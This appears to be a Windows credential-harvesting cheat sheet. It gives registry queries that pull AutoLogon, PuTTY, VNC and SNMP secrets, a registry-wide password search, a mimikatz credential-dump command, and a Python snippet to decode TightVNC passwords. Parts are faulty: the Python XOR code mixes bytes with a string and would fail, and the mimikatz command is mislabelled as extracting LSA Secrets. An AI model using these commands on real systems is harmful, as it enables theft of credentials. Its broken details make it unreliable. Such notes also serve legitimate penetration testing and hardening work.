## 1. AutoLogon Credentials

### Registry Path:

```cmd
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

### Commands to Query:

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
```
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

*   ``AutoAdminLogon = 1`` means auto-logon is enabled.
*   if ``DefaultPassword`` is missing, it might be stored in **LSA Secrets** instead.

---

## 2. PuTTY Stored Session

*   PuTTY saves **proxy credentials** in the registry.

### Registry Path

```cmd
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
```

### Commands To Query

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\centos7 -v ProxyUsername
```

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\centos7 -v ProxyPassword
```

*   Passwords might be encoded (Base64) but not encrypted. Decode with powershell.

```powershell
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("<string>"))
```

---

##  3.  TightVNC Stored Password

*   TightVNC passwords are stored in the registry, often **encoded** using weak **XOR-Based encryption**

### Registry Path

```cmd
HKEY_CURRENT_USER\Software\TightVNC\Server
```

### Commands To Query

```cmd
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password
```

```cmd
reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly
```

*   use ``vncpwd.exe`` to decode VNC passowrds:

```cmd
C:\Users\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]
```

---

## 4.   VNC Credentials (Encrypted)

* ReaalVNC and WinVNC store credentials in the registry

### Registry Path

*   **WinVNC3**

```cmd
HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password
```

*   **RealVNC**

```cmd
HKEY_CURRENT_USER\Software\RealVNC\WinVNC4 /v password
```

### Command to Query:

```cmd
reg query "HKCU\Software\ORL\WinVNC3" /v password
```
```cmd
reg query "HKLM\Software\RealVNC\WinVNC4" /v password
```

*   use ``vncpwd.exe`` to decode VNC passowrds:

```cmd
vncpwd.exe [Encrypted Password]
```

---

## 5.   SNMP Community Strings

###   Registry Path:

```cmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP
```

### Commands to Query

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP
```

---

## 6.   Searching for Passwords in Registry

### Search Entire Registry for "password" (Local Machine):

```cmd
reg query "HKEY_LOCAL_MACHINE" /s | findstr /i "pass*"
```

### Search Entire Registry for "password" (Current User):

```cmd
reg query "HKEY_CURRENT_USER" /s | findstr /i "pass*"
```

---

## 7.   Fault Tolerant Heap (FTH) Rules

*   ``FTH`` stored compatibility fixes for the application, which sometimes include sensitive info

### Registry Path:

```cmd
HKEY_LOCAL_MACHINE\Software\Microsoft\FTH
```


### Command to Query:

```cmd
reg query "HKLM\Software\Microsoft\FTH" /V RuleList
```

---

## Pro Tips:

### Extract LSA Secrets( if passwords are missing):

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Extract VNC Passwords from Registry (Directly):

```powershell
(Get-ItemProperty -Path 'HKCU\Software\ORL\WinVNC3').Password
```

### Decrypt TightVNC Password

```python
import base64
key = 'tightvnc'
enc = b'PASSWORD_HEX'
dec = bytes([a ^ b for a, b in zip(enc, key * (len(enc) // len(key) + 1))])
print(dec.decode('utf-8'))
```